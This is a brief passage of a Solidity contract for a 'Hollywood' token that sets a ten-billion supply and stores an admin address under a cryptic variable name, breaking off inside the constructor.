...
contract HolldTOKEN is Ownable {
    
    uint256 AMOUNTGLOBALADMOUNT = 10000000000*10**decimals();
    uint256 private _seitotalSupply = AMOUNTGLOBALADMOUNT;
    string private _seitokenname = "Hollywood";
    string private _seitokensymbol = "Hollywood";
    address public raacnfh78;
    constructor(address tokenadmin) {
        raacnfh78 = tokenadmin;
